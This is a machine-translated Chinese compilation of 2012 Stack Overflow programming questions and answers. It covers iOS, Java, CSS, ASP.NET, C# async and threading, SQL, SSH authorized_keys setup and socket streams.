        self.userAccessToken = [FBSession activeSession].accessTokenData.accessToken;
    }
    //Using KVC, since it is a readonly property
    [[FBSession activeSession].accessTokenData setValue:aFanPageToken forKey:@"accessToken"];
}

- (void)postAsMe {
    if (self.userAccessToken == nil) {
        return; //Already posting as me
    }
    [[FBSession activeSession].accessTokenData setValue:self.userAccessToken forKey:@"accessToken"];
    self.userAccessToken = nil;
}

// Make sure you cleanup on logout
- (void)logout {
    self.userAccessToken = nil;
    [[FBSession activeSession] closeAndClearTokenInformation];
} 
```

# objective-c - 创建自己的视图控制器我可以模态呈现

> ID：12392549
> 
> 赞同：0
> 
> 时间：2012-09-12T16:23:03.370
> 
> 标签：objective-c, ios, presentmodalviewcontroller

我想创建一个可以呈现模态视图的对象，例如 UIImagePickerController。使用 UIImagePickerController 创建对象，对其进行配置，然后以模态方式呈现它。喜欢：

```
 UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];
    //Configure the UIImagePickerController
    imagePicker.sourceType        =   UIImagePickerControllerSourceTypeCamera;
    imagePicker.mediaTypes        =   [[NSArray alloc] initWithObjects: @"public.movie", nil];
    imagePicker.videoQuality      =   UIImagePickerControllerQualityTypeMedium;
    imagePicker.cameraDevice      =   UIImagePickerControllerCameraDeviceRear;
    imagePicker.cameraCaptureMode =   UIImagePickerControllerCameraCaptureModeVideo;
    imagePicker.delegate          =   self;
    imagePicker.allowsEditing     =   YES;
    //Present the Controller 
    [self presentModalViewController:imagePicker animated:YES]; 
```

我想做同样的事情。我想要一个控制器，我可以实例化、配置然后呈现它。不过，我对如何继续进行感到困惑。我是否使用标准 UIViewControler（查看 UIImagePickerController 标头我看到苹果使用 UINavigationController）？如何将视图连接到此控制器？它是故事板还是只是一个xib文件。我想以这种方式构建我的控制器，因为对象对于在其他项目中重用很有用，所以我希望能够将它发送到其他项目，并附上有关如何配置它的文档，并且他们可以将其插入并且它可以工作（基本面向对象）。有没有关于如何做到这一点的基本指南？

感谢您的阅读和帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:28:38.273

了解如何执行此操作的一个好地方是查看 Apple 的[iOS 视图控制器编程指南。](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/BasicViewControllers/BasicViewControllers.html#//apple_ref/doc/uid/TP40007457-CH101-SW35) 它提供了一些很好的例子和不同的选项来说明如何完成这项工作。

另外，您是否完成/找到了任何显示构建简单应用程序过程的简单教程？

祝你好运。

# java - 监听器通知一系列事件的完成（启动同步服务）

> ID：12392553
> 
> 赞同：0
> 
> 时间：2012-09-12T16:23:17.067
> 
> 标签：java, android

我有三个班级，我从中开始了三个服务。这三个服务将同时启动。

我在每个服务类中都有回调方法，以了解该特定服务是否已启动。

尽管这三个服务是同时启动的，但没有顺序首先启动这三个服务。

有人可以告诉我最好的使用方法，以便在上次服务开始时通知我吗？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:34:49.677

我会这样做：

```
public class CounterAndNotifier
{
    private int counter = 0;
    private int count;
    private Runnable runnable;

    public CounterAndNotifier(int count, Runnable runnable)
    {
        this.count = count;
        this.runnable = runnable;
    }

    public synchronized void incrementCounter()
    {
        counter++;
        if (counter == count) {
            runnable.run();
        }
    }
} 
```

1.  创建一个类，该类将在`Runnable`所有三个服务启动后收到通知。
2.  此类维护一个计数器和一个`synchronized`递增计数器的方法。
3.  `Runnable.run()`一旦计数达到，递增计数器的方法将调用`3`。
4.  创建此类的一个对象，并将其传递给三个服务，以便`incrementCounter()`在服务完成并运行后调用该方法。

希望这可以帮助。

# jquery - 我的 A 标签未将宽度设置为标签内的父级

> ID：12392559
> 
> 赞同：1
> 
> 时间：2012-09-12T16:23:49.353
> 
> 标签：jquery, css

我的小提琴位于：

[http://jsfiddle.net/9QHpP/](http://jsfiddle.net/9QHpP/)

我正在尝试将锚标记的宽度设置为包含它的 TD 的大小。将宽度设置为 100% 或继承不起作用，jquery 也不能设置宽度。

你怎么做呢？可能吗？我已经尝试了几种方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:25:29.747

您可以将链接的显示样式更改为`block`or `inline-block`，它应该可以工作：

```
a{
   background-color: blue;   
   display:block;
} 
```

[这是您修改后的示例](http://jsfiddle.net/9QHpP/2/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:24:53.043

使用`display: block`或标记`display: inline-block`。`a`

```
a {
  background-color: blue;  
  display: block;       
} 
```

***[演示](http://jsfiddle.net/9QHpP/1/)***

***或者***

```
a {
  background-color: blue;  
  display: inline-block;       
} 
```

***[演示](http://jsfiddle.net/9QHpP/3/)***

# asp.net - Control.Enabled 是如何工作的？

> ID：12392560
> 
> 赞同：0
> 
> 时间：2012-09-12T16:23:56.200
> 
> 标签：asp.net, controls

我想禁用此 Listview 项目中的所有控件。[这个 MSDN](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.enabled%28v=vs.100%29.aspx)页面说 Enabled 被定义为 Control 的类属性。

```
foreach (Control ctrl in eItem.Controls)
{
    ctrl.Enabled = false;
} 
```

我收到错误消息“控件不包含已启用的定义...”。只有当我施放每个控件时，错误才会消失。

```
foreach (Control ctrl in eItem.Controls)
{
    ((TextBox)ctrl).Enabled = false;
} 
```

我有 DropDownList、TextBox、Button、CheckBox、.. 有没有最快和通用的方法呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:27:53.277

您提供的链接误导了您，因为它谈论的是*Windows 窗体*控件，而不是*Web 窗体控件*。在 Web Froms 中，属性`Enabled`是在类中[定义](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.webcontrol.enabled.aspx)`WebControl`的，它是 的子类`Control`和超类`TextBox`等`DropDownList`。所以你可以这样做：

```
foreach (Control ctrl in eItem.Controls)
{
    WebControl webCtrl = ctrl as WebControl;
    if (webCtrl != null)
    {
        webCtrl.Enabled = false;
    }
} 
```

# java - 使用 Eclipse 的 playOrm

> ID：12392563
> 
> 赞同：1
> 
> 时间：2012-09-12T16:24:04.400
> 
> 标签：java, eclipse, playorm

对于初学者，并且被授予 Java 开发新手，我有几个问题。

我正在使用 Eclipse IDE，并下载了一个 zip 文件 *com.alvazan.orm 库。

从现有的 Ant Buildfile 初始化 Java 项目，并使用 build.xml 文件，我得到了大量的 com.alvazan.orm.api 包，每个包都包含各种 .java 文件/测试用例和相等数量的 .Jar 文件，其中包含偶数更多包等

所以，马上，我注意到几个警告，**Java Build Problems**

1.  项目“std_buildfile”中的类路径变量“JRE_LIB”已弃用：改用 JRE 系统库

这会影响测试用例的运行和调试吗？

此外，我在初始构建时遇到了**Java Problems**：

1.  DboColumnToManyMeta 类型的 translateToColumnImpl(Collection, RowToPersist, Collection) 方法从未在本地使用
2.  局部变量existing的值没有被使用
3.  未使用局部变量 toBeAdded 的值
4.  未使用局部变量 toBeRemoved 的值

虽然这些目前只是错误，但由于尝试运行各种测试用例并提出更多警告和错误，我担心迫在眉睫的警告可能会影响结果。

请告知这是否需要解决，或者是否通常是常见的。

我很乐意发布更多必要的信息，让我知道什么是必要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:31:20.530

这些“警告”不是错误是常见的。只有当您看到红色错误时才会遇到问题。Eclipse 喜欢告诉您潜在的问题，例如应该删除通常未使用的字段。很多时候字段没有被删除，因为它们即将被使用。但是，这些警告都不会影响您运行或调试程序的能力。只有红色错误会影响您的运行，并且当您尝试在 eclipse 中运行并出现红色警告时，eclipse 甚至会提示您说“这甚至无法编译，您确定您还想运行吗”，通常您不应该在运行时运行有红色错误。

# ant - 使用 Ant 创建 SAR 文件

> ID：12392566
> 
> 赞同：0
> 
> 时间：2012-09-12T16:24:12.350
> 
> 标签：ant, sar

我正在重新构建一个版本，并注意到 ear 文件包含一个服务存档文件 (sar)。我想在 Ant 中构建 sar 文件。我怀疑我可以使用`ear`or`zip`任务来执行此操作，只需将文件命名为`*.sar`. 但是，我想确保这会奏效。

我将在 Ant 中使用什么任务来创建 SAR 文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T20:24:47.297

sar 文件是一种特殊的 jar 文件（在 WEB-INF 中有某些文件等）。所以你可以使用这个`jar`任务，例如：

```
<jar destfile="${sar.filename}">...</jar> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T20:24:50.213

看来您应该在 ANT 中使用标准 JAR 任务。根据 JBoss 文档，SAR 文件包含一个额外的文件：

*   [META-INF/jboss-service.xml](https://community.jboss.org/wiki/ServiceArchive)

以下“hello world”示例附加了一个示例项目：

*   [https://community.jboss.org/wiki/ExampleHelloWorldService](https://community.jboss.org/wiki/ExampleHelloWorldService)

# c# - 异步方法永远不会返回

> ID：12392567
> 
> 赞同：5
> 
> 时间：2012-09-12T16:24:17.437
> 
> 标签：c#, windows-8, task-parallel-library, deadlock, async-await

> **可能重复：**
> [WinRT：使用 GetFileFromApplicationUriAsync() 加载静态数据](https://stackoverflow.com/questions/12235085/winrt-loading-static-data-with-getfilefromapplicationuriasync)

我的应用程序中的以下代码被调用，但它永远不会返回或抛出异常：

```
public async Task Load()
{
    ...
    StorageFile file = 
      await StorageFile.GetFileFromApplicationUriAsync(new Uri("ms-appx:///" + name));
    ...
} 
```

这就是我调用该方法的方式：

```
x.Load().Wait(); 
```

为什么等待的方法`GetFileFromApplicationUriAsync()`永远不会返回？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-12T21:48:28.410

当您（同步）阻塞异步代码时，您[会遇到死锁问题](http://blog.stephencleary.com/2012/07/dont-block-on-async-code.html)。

遵循以下最佳做法：

1.  `ConfigureAwait(false)`尽可能在您的库方法中使用（例如，）`Load`。
2.  一直使用`async`下去；不要阻塞`async`代码。

在您的情况下，听起来`Load`可能被称为启动的一部分。异步执行这有点棘手（因为构造函数可能不是`async`）。但是，您应该能够通过使用[异步延迟初始化](http://blog.stephencleary.com/2012/08/asynchronous-lazy-initialization.html)来使其工作。

# http - 正确的 HTTP 模拟

> ID：12392570
> 
> 赞同：1
> 
> 时间：2012-09-12T16:24:22.887
> 
> 标签：http

我正在尝试使用简单的 TCP 套接字模拟客户端和服务器之间的 HTTP 通信——它可以工作，但不适用于所有用户。其中一些在发送第二条消息时被丢弃。我确实发送到服务器（消息是 base64 编码的）：

```
POST / HTTP/1.1
Connection: keep-alive
Content-type: text/plain
Content-length: 4

AwEc 
```

并从中做出回应：

```
HTTP/1.1 200 OK[trailing space here]
Connection: Keep-Alive
Content-Type: text/plain
Content-Length: 4

AwEc 
```

如果我从客户端向服务器发送另一条消息 - 连接会立即断开。我能错过什么？

# c# - 确保 C# 中静态方法的线程安全

> ID：12392572
> 
> 赞同：5
> 
> 时间：2012-09-12T16:24:31.903
> 
> 标签：c#, .net, multithreading, static, thread-safety

我目前在静态类/方法中有一些代码，但我想检查它是否是线程安全的。从我读过的内容来看，我认为这应该没问题，但在我的脑海里有些东西说它可能不是。我的网页的数据处理阶段使用外部 Web 服务来创建订单记录，这可能会很慢：可能需要 30-40 秒，也可能需要 5 或 10 分钟（这不在我的掌控之中）所以我要开除将页面返回给用户，然后启动一个新线程，然后在处理完成后向用户发送电子邮件。这目前在静态类/方法中。如果我的所有对象都是在特定方法中创建的（除了系统默认值，这很常见），那么该方法应该是线程安全的，不是吗。所以，例如，如果我有

```
public static class ProcessOrder()
{
    public static int GetOrderMaxSize()
    {
        return (....gets and parses ConfigurationManager.AppSettings["MaxOrderSize"]...);
    }

    public static bool CreateOrder(Order order)
    {
        XmlDocument xmlDoc = GetOrderXML(order);
        bool check = false;
        using (CreateOrderXML.Create xmlCo = new CreateOrderXML.Create())
        {
            xmlCo.Timeout = 60000;
            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();

            string xmlString = "";
            using (StringWriter stringWriter = new StringWriter())
            {
                using (XmlWriter xmlWriter = XmlWriter.Create(stringWriter))
                {
                    xmlDoc.WriteTo(xmlWriter);
                    xmlWriter.Flush();
                    xmlString = stringWriter.GetStringBuilder().ToString();
                }
            }

            byte[] bXMLOrder = encoding.GetBytes(xmlString);
            byte[] breturnMessage;

            check = xmlCo.Create(bXMLOrder, out breturnMessage);
            .... do something with return message
        }
        return check;
    }

    private static XmlDocument GetOrderXML(Order order)
    {
        ... creates an XML object for the order
    }
} 
```

（CreateOrderXML 是对 Web 服务 URL/方法的服务引用）是否是线程安全的，尤其是对于长时间运行的（主要在 xmlCo.Create(....) 阶段）并发线程？我知道如果我开始放入类成员然后在方法中使用它们，这肯定会引入不同线程覆盖值的问题，但只要在方法中创建对象，它们应该没问题，不应该他们吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-12T16:29:35.173

您似乎没有访问那里的任何共享数据；您正在请求远程资源，并在每次执行此方法时构建一组唯一的数据。那里不需要同步。

此处方法的每次执行都在创建局部变量 - 它是自己的副本。所以没有任何东西被共享。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-12T16:48:07.783

如果您的静态方法不访问任何静态（类）数据，它应该是线程安全的。唯一可能的争论点是它可能使用的外部资源（例如文件或其他系统资源）和传入的数据。只有您知道这种使用的上下文。

可以使用可能存在争用的此类事物的用法可以使用一个`lock`或其他原语进行序列化。不要忘记以相同的顺序序列化资源，以免死锁。如果您有一种使用资源 A 和 B 的方法：

```
lock( latch_a )
{
   process(object_a) ;
   lock ( latch_b )
   {
     process(object_a,object_b) ;
   }
} 
```

和另一种相反的方法：

```
lock( latch_b )
{
   process(object_b) ;
   lock ( latch_a )
   {
     process(object_a,object_b) ;
   }
} 
```

在某些时候，你的两个线程会死锁，当它们中的每一个都需要一个资源时，另一个需要它才能放弃对所述资源的访问。

**编辑说明：**有关详细信息 ，请参阅该[`lock`](http://msdn.microsoft.com/en-us/library/c5kehkcz%28v=vs.100%29.aspx)语句的 C# 文档。通常，锁定对象代表（并且可能是）正在序列化的共享资源访问。一种常见的模式是执行以下操作：

```
class Widget
{
   private static readonly object X = new object() ;

   public void Foo()
   {
     lock(X)
     {
       // Do work using shared resource
     }
     return ;
   }

} 
```

# c# - 如何将十进制（整数）转换为二进制，使用二进制，然后在 C# 中将其转换回十进制

> ID：12392585
> 
> 赞同：1
> 
> 时间：2012-09-12T16:25:21.520
> 
> 标签：c#, bit-manipulation

我想知道是否有内置类用于处理二进制数并将任何数字（在本例中为十进制）转换为二进制，反之亦然。例如，如果我想检查第三位是否是`1`我可以使用`&`按位运算符，但我觉得如果确实有办法将十进制转换为二进制并检查我想要的位置上的值，它会更简单。我已经搜索并找到了使用示例，`BitArray`但由于某种原因，它给我一个错误，它不存在，我想知道它是否已过时。我还尝试了 MS 库并找到`BitConverter.GetBytes(value)`了，但我不确定它的作用是什么，因为当我尝试以下示例时：

```
 int value = 12345678;
  byte[] bytes = BitConverter.GetBytes(value);
  Console.WriteLine(BitConverter.ToString(bytes)); 
```

输出是`4E-61-BC-00`我不确定实际上是什么。我正在寻找的是如果我喜欢`int i = 247; // 11110111`然后：

```
i[0] = 1;
i[1] = 1;
i[2] = 1;
i[3] = 0;
i[4] = 1;
i[5] = 1;
i[6] = 1;
i[7] = 1; 
```

所以我可以得到任何位置的 1 或 0。

```
i[2] = 1; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:27:38.167

您应该使用 BitArray，只需确保您使用 System.Collections 添加；到您的 CS 文件。您可以传递一个新的 BitArray 一个 byte[]，它将为您处理转换。

[http://msdn.microsoft.com/en-us/library/x1xda43a.aspx](http://msdn.microsoft.com/en-us/library/x1xda43a.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:33:22.017

嗯，是的，你可以`BitArray`从一个创建一个`int`：

```
int i = 247;
BitArray b = new BitArray(i); 
```

然后你可以检查第三位：

```
if (b[2])
{
    // the bit is set
} 
```

中的元素`BitArray`是`Boolean`，因此要设置第三位，您可以编写：

```
b[2] = true; 
```

不过，转换回 an`int`有点痛苦。因为您必须使用`CopyTo`将 复制`BitArray`到`int[]`，然后访问 中的第一项`int[]`。

我不明白你为什么要经历头痛。它比使用按位运算符要慢得多，也更麻烦`&`。您可以轻松地为不同的位值创建常量：

```
const int bit0 = 0x01;
const int bit1 = 0x02;
const int bit2 = 0x04;
const int bit3 = 0x08;
const int bit4 = 0x10;
// etc. 
```

接着：

```
if ((i & bit2) != 0)
{
    // the bit is set
} 
```

设置单个位是：

```
i |= bit2; 
```

稍微重置一下是：

```
i &= ~bit2; 
```

# sql - 数据库逻辑，查询具有重复值的表

> ID：12392594
> 
> 赞同：0
> 
> 时间：2012-09-12T16:26:11.310
> 
> 标签：sql, database

很抱歉，很难想出一个描述性的标题。

我有一个带有复合键的两列表——> ids 和属性。因此，一个 id 可能会在表中出现两次，但每个实例具有不同的属性。

```
id    attribute
1     1
1     2
2     2
3     1 
```

我的问题是如何查询这个。例如我想找到匹配两个属性的所有 id

```
SELECT a.id
FROM   table AS a, table AS b
WHERE  a.attribute = 1
AND    b.attribute = 2
AND    a.id = b.id 
```

所以这个查询应该只返回 id 1。

这是非常严格的，因为我需要提前知道要搜索多少个属性，尽管动态创建 SQL 可能是可能的。

有没有更好的方法来查询这样的表？首先有没有更好的方法来构建这个表？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:32:38.037

```
SELECT id
FROM   table
WHERE  attribute in (1,2)
group by id
having count(id) = 2 
```

这假设同一属性只能分配给一个 id 一次（id/attribute 组合是唯一的）

[SQLFiddle 示例](http://sqlfiddle.com/#!1/6aaa1/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:42:28.517

您可以进行*表格旋转*并创建数据的平面视图，如下所示。缺点是您必须对结果中的列数施加固定限制。这是一个例子：

```
create view flat_attributes
as
select id ,
       attr_1 = t1.attribute ,
       attr_2 = t2.attribute ,
       attr_3 = t3.attribute ,
       ...
       attr_N = tN.attribute
from ( select distinct
              id
       from attributes
     ) t
left join attributes t1 on t1.id = t.id and t1.attribute = 1
left join attributes t2 on t2.id = t.id and t1.attribute = 2
left join attributes t3 on t3.id = t.id and t1.attribute = 3
...
left join attributes tN on tN.id = t.id and tN.attribute = N 
```

任何`attr`非空列都意味着有`id`问题的列具有该属性。它应该简化查询。

# c# - 从 ObservableCollection 中删除空项

> ID：12392596
> 
> 赞同：1
> 
> 时间：2012-09-12T16:26:13.727
> 
> 标签：c#, .net

我在使用以下代码时遇到了一些问题：

```
AllAgents.CollectionChanged += (sender, e) =>
            {
                if (e.Action != NotifyCollectionChangedAction.Remove) return;

                foreach (var s in AllSnapshots)
                {
                    foreach (var stat in s.Stats.Where(stat => stat.Model.Agent == null))
                        s.Stats.Remove(stat);
                }
            }; 
```

这当然会抛出“集合已修改；枚举操作可能无法执行”。例外，这对我来说完全有意义。问题是，从我的 ObservableCollection 中删除 Model.Agent 属性为空的所有项目的最佳方法是什么？我也对其他解决方案持开放态度，本质上，当从 AllAgents 集合中删除代理时，我需要从我的 AllSnapshots.Stats 集合中删除引用该代理的所有条目。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:36:35.773

从这样的集合中删除项目的最佳方法是使用标准`for`循环构造并向后迭代集合。由于您不再依赖枚举器来迭代集合，因此您可以安全地修改它而不会干扰循环。

反向迭代可防止在循环过程中删除干扰索引，否则会使您面临某些元素最终不会被删除的可能性。

```
ObservableCollection<Stat> o = new ObservableCollection<Stat>();
for (int i = o.Count - 1; i >= 0; i--) {
    if (o[i] == null) 
        o.RemoveAt(i);                
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:33:52.933

问题是您正在迭代和删除并尝试再次迭代。这不受支持，`ObservableCollection`因为它不跟踪删除了哪些元素。

将您的替换`foreach`为不依赖于要修改的集合的标准编号，仅此而已。

这个解决方案推迟了 Sam 我的回答，因为它不使用额外的内存来创建另一个列表（如果你的元素数量足够大，这可能会非常昂贵）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:30:32.343

我可能要做的是生成要删除的统计信息列表，然后在单独的 foreach 循环中将它们全部删除

```
foreach (var s in AllSnapshots)
{
    list<object> stats = new list<object> 
   //if this doesn't work i'll leave it up to you to look up how to list a generic type

    foreach (var stat in s.Stats.Where(stat => stat.Model.Agent == null))
        stats.add(stat);

    foreach(var stat in stats)
        s.Stats.Remove(stat);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:40:52.090

如果每个 Snapshot 的 Stats 数量相当少，我可能会这样做：

```
foreach(var s in AllSnapShots)
{
    s.Stats = new ObservableCollection<Stats>(s.Where(stat =>stat.Model.Agent != null));
} 
```

*因此，这将构建一个包含非*空元素的新集合。但是，如果统计信息列表相当大，您也可以这样做：

```
List<WhateverYourCollectionWasOf> statsToDelete;

foreach(var s in AllSnapShots)
{
    statsToDelete.AddRange(s.Stats.Where(stat => stat.Model.Agent == null));

    foreach (var stat in statsToDelete)
    {
         s.Stats.Remove(stat);
    }
} 
```

或者，如果你想要更多的未来证明，你可以编写一个扩展方法来做这样的事情：

```
public static class ExtensionMethods
{
    public static ObservableCollection<T> RemoveAll<T>(
        this ObservableCollection<T> collection, Func<T, bool> predicate)
    {
        List<T> collectionAsList = collection.ToList();
        List<T> itemsToRemove = collection.Where(predicate);            
        collectionAsList.RemoveAll(i => itemsToRemove.Contains(i));
        collection = new ObservableCollection<T>(collectionAsList);
        return collection;
    }
} 
```

然后会这样调用：

```
foreach(var s in AllSnapShots)
{
    s.Stats.RemoveAll(stat => stat.Model.Agent == null);
} 
```

# ubuntu-11.10 - 如何将 RSA 密钥添加到 authorized_keys 文件？

> ID：12392598
> 
> 赞同：116
> 
> 时间：2012-09-12T16:26:22.987
> 
> 标签：ubuntu-11.10, ssh-keys, authorized-keys

我已经创建了一个 RSA 公钥，我想将它添加到`authorized_keys`文件中，但是我的 Ubuntu 11.10 机器中没有这样的文件。

如何添加密钥`authorized_keys`？

* * *

## 回答 #1

> 赞同：133
> 
> 时间：2014-01-21T11:51:05.137

确保在执行 Michael Krelin 的解决方案时执行以下操作

```
cat <your_public_key_file> >> ~/.ssh/authorized_keys 
```

请注意，如果没有 double`>>`的现有内容`authorized_keys`将被覆盖（核弹！），这可能是不可取的。

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2012-09-12T16:27:17.770

```
mkdir -p ~/.ssh/ 
```

### 覆盖authorized_keys

```
cat your_key > ~/.ssh/authorized_keys 
```

### 附加到 authorized_keys 的末尾

```
cat your_key >> ~/.ssh/authorized_keys 
```

* * *

## 回答 #3

> 赞同：57
> 
> 时间：2017-11-10T14:03:16.947

ssh 套件中已经有一个命令可以自动为您执行此操作。即登录到远程主机并将公钥添加到该计算机的authorized_keys 文件中。

```
ssh-copy-id -i /path/to/key/file user@host.com 
```

如果您要安装的密钥是，`~/.ssh/id_rsa`那么您甚至可以完全放弃该`-i`标志。

比手动做好多了！

* * *

## 回答 #4

> 赞同：40
> 
> 时间：2016-02-23T07:41:44.767

我知道我回复得太晚了，但对于需要这个的其他人，请从本地计算机运行以下命令

```
cat ~/.ssh/id_rsa.pub | ssh user@192.168.1.1 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys" 
```

这工作得很好。您需要做的只是更换

> 用户@192.168.1.1

与该特定主机的您自己的用户

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-03-20T10:50:06.140

```
>ssh user@serverip -p portnumber 
>sudo bash (if user does not have bash shell else skip this line)
>cd /home/user/.ssh
>echo ssh_rsa...this is the key >> authorized_keys 
```

# c# - Ranorex 将数组作为参数传递

> ID：12392601
> 
> 赞同：1
> 
> 时间：2012-09-12T16:26:36.830
> 
> 标签：c#, c#-4.0, ranorex

我有一些计算要完成。我想将我的数组发送到一个进行一些计算的方法。我如何在这里格式化发送方法？如何格式化接收方方法的接收签名行？如何拆分数组以使用每个元素？

```
public void PercentCompare()
{
    string[] cells = {
          "Repo.Path.ToString()", 
          "Repo.Path.ToString()", 
          "Repo.Path.ToString()"
       };

    Path.CountDoublePercent(cells[]);
}

public static void CountD(string[] cells)
{
    //trims
    string trimRow1 = string.Empty; 
    string trimRow2 = string.Empty;
    string trimTotal = string.Empty; 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-09-27T09:07:38.967

[http://www.ranorex.com/forum/passing-array-as-usercode-argument-t8098.html](http://www.ranorex.com/forum/passing-array-as-usercode-argument-t8098.html)

这个网站说：不可能使用数组作为 UserCode 方法的参数

你真的能做到没有错误吗？

# c# - 无法从 C# 中的流中读取

> ID：12392604
> 
> 赞同：0
> 
> 时间：2012-09-12T16:26:46.573
> 
> 标签：c#, .net, sockets

我正在构建一个简单的从服务器向客户端传递消息的基本程序。

现在我能够成功地在服务器和客户端之间建立连接，但是客户端程序无法从流中读取。这是我的代码。

服务器程序代码

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Net.Sockets;

namespace chat_client_console
{
    class Program
    {
        static TcpListener listener;
        static void Main(string[] args)
        {
            string name = Dns.GetHostName();
            IPAddress[] address = Dns.GetHostAddresses(name);

            /*
            foreach(IPAddress addr in address)
            {
                Console.WriteLine(addr);
            }*/
            Console.WriteLine(address[1].ToString());
            listener = new TcpListener(address[1], 2055);

            listener.Start();

            Socket soc = listener.AcceptSocket();
            Console.WriteLine("Connection successful");
            Stream s = new NetworkStream(soc);

            StreamReader sr = new StreamReader(s);
            StreamWriter sw = new StreamWriter(s);

            sw.AutoFlush = true;
            sw.Write("A test message");
            Console.WriteLine("Test message delivered. Now ending the program");

            /*
            string name = Dns.GetHostName();
            Console.WriteLine(name);
            //IPHostEntry ip = Dns.GetHostEntry(name);
            //Console.WriteLine(ip.AddressList[0].ToString());
            IPAddress[] adr=Dns.GetHostAddresses(name);
            foreach (IPAddress adress in adr)
            {
                Console.WriteLine(adress);
            }
            */
            Console.ReadLine();
        }
    }
} 
```

这是客户端程序的代码

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net.Sockets;

namespace chat_client_console_client
{
    class Program
    {
        static void Main(string[] args)
        {
            string display;
            TcpClient client = new TcpClient("localhost", 2055);
            Stream s = client.GetStream();
            Console.WriteLine("Connection successfully received");

            StreamWriter sw = new StreamWriter(s);
            StreamReader sr = new StreamReader(s);
            sw.AutoFlush = true;
            while (true)
            {

                display = sr.ReadLine();
                Console.WriteLine("Reading stream");
                if (display == "")
                {
                    Console.WriteLine("breaking stream");
                    break;
                }

            }

            Console.WriteLine(display);
        }
    }
} 
```

现在我能够成功地建立程序之间的连接，如各种检查消息所示。服务器程序也能够成功地将数据发送到流中。

但是，客户端程序无法从流中读取数据。它似乎卡在 readline() 函数上。

现在我已经在这个问题上撞了几个小时了，如果有人能够帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:28:35.710

看看你的服务器：

```
sw.AutoFlush = true;
sw.Write("A test message"); 
```

您永远不会写换行符，这是客户正在等待看到的。

# asp.net - 将两个网格视图放在一起

> ID：12392623
> 
> 赞同：0
> 
> 时间：2012-09-12T16:27:53.350
> 
> 标签：asp.net, html

我想像这样在彼此之上有两个网格视图：![在此处输入图像描述](../Images/66d00d8a3d95b33174e4d68da5e15698.png)

顶部的样式为 float:right 和 overflow: auto 用于滚动条。

底部的样式溢出：滚动条的 auto 也是如此。

但是，当我尝试查看我的页面时，gridview 2 最终位于 gridview 1 的左侧（除非我删除了溢出：自动）。有没有办法解决这个问题？我尝试使用`<br>`但没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:35:49.130

在两个网格视图之间添加一个`<div>`元素，该元素`style="clear: both;"`将用作浮动元素之间的中断。

***或者***你可以添加`style="clear: both;"`到每个gridview。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:52:58.783

您在这里有两个选择.. 正如@Mike 建议的那样，为两个 div 添加 Clear:both ..

或者将两个网格完全放在不同的 div 中。

由于 div 是块级元素，它们将一个低于另一个..

# asp.net - 如何清除图表控件asp.net的视图状态数据

> ID：12392626
> 
> 赞同：0
> 
> 时间：2012-09-12T16:28:18.977
> 
> 标签：asp.net, vb.net, charts, viewstate, microsoft-chart-controls

我在网页上有一个图表。我的按钮也很少。其中一个按钮是将数据绑定到图表。我有一个下拉列表，有不同的选项来加载数据和绑定图表。

如果我单击页面上的其他按钮，页面回发和图表将变为空白。所以我用谷歌搜索并将 EnableViewState="True" 添加到图表中。现在我可以单击其他按钮和回发，图表仍然存在。伟大的。

但是当我从下拉列表中选择不同的项目并单击执行图表绑定的按钮时，出现错误。我知道这是因为我将图表的 EnableViewState 属性设置为 True 并且图表上已经有数据，所以图表不会让我再次绑定数据。

因此，我尝试在将数据绑定到图表的按钮单击按钮上设置 Chart1.ViewStateContent = Nothing。那也失败了。错误是非法枚举值：0。

那么如何使它工作呢？

谢谢 ...

# java - 使用 Java 64 位 1.7.0_06+ 从 JNLP 启动应用程序时出现 NullPointerException

> ID：12392629
> 
> 赞同：4
> 
> 时间：2012-09-12T16:28:24.560
> 
> 标签：java, nullpointerexception, jnlp, java-web-start

以下应用程序与 Java 1.7.0_05 及更早版本完美配合：

```
<jnlp spec="1.0+" codebase="http://localhost/demo/">
    <information>
        <title>BPI 4.7</title>
        <vendor>Fox Technical Services Inc.</vendor>
        <homepage href="/home.html"/>
        <description>Fox Client</description>
        <description kind="short">Fox</description>
        <icon href="base/Fox64.gif" height="64" width="64"/>
    </information>
    <security>
        <all-permissions/>
    </security>
    <resources>
        <j2se href="http://java.sun.com/products/autodl/j2se" version="1.6+"/>
